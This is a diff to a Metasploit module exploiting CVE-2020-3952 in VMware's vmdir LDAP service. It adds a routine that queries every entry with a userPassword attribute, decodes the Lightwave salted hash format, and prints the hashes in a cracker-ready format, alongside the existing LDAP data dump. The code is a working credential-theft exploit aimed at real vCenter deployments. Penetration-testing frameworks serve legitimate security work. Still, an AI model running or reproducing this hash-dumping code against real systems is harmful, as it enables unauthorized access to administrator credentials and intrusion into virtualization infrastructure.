@@ -19,7 +19,7 @@ class MetasploitModule < Msf::Auxiliary
           6.7U3f update.
         },
         'Author' => [
-          # Discovered by unknown researcher(s)
+          'Hynek Petrak', # Discovered by, added hash dumping
           'wvu' # Module
         ],
         'References' => [
@@ -71,6 +71,7 @@ class MetasploitModule < Msf::Auxiliary
     }
 
     entries = nil
+    hash_entries = nil
 
     Net::LDAP.open(opts) do |ldap|
       if (@base_dn = datastore['BASE_DN'])
@@ -85,6 +86,10 @@ class MetasploitModule < Msf::Auxiliary
 
       print_status("Dumping LDAP data from vmdir service at #{peer}")
       entries = ldap.search(base: base_dn)
+
+      attrs = ["-", "userPassword"]
+      filter = "(userPassword = *)"
+      hash_entries = ldap.search(base: base_dn, filter: filter, attributes: attrs)
     end
 
     # Look for an entry with a non-empty vmwSTSPrivateKey attribute
@@ -94,6 +99,13 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     print_good("#{peer} is vulnerable to CVE-2020-3952")
+
+    if hash_entries.any?
+      process_hashes(hash_entries)
+    else
+      print_status("#{peer} no passowrd hashes found")
+    end
+
     pillage(entries)
 
     # HACK: Stash discovered base DN in CheckCode reason
@@ -130,6 +142,25 @@ class MetasploitModule < Msf::Auxiliary
     if policy
       print_status('Password and lockout policy:')
       print_line(policy.to_ldif)
+    end
+  end
+
+  def process_hashes(entries)
+    entries.each do |entry|
+      dn = entry.dn
+      userpass = entry.userpassword.first.to_s
+      type = userpass[0].ord
+
+      # https://github.com/vmware/lightwave/blob/d50d41edd1d9cb59e7b7cc1ad284b9e46bfa703d/lwraft/server/middle-layer/password.c#L36
+      if type == 1
+        hexhash = userpass.unpack("H*").first
+        hash = hexhash[2, 128]
+        salt = hexhash[2+128, 32]
+        print_good("#{rhost} #{dn}:$dynamic_82$#{hash}$HEX$#{salt}")
+      else
+        print_error("#{peer} FIXME: hash type #{type} not yet supported")
+        next
+      end
     end
   end
 
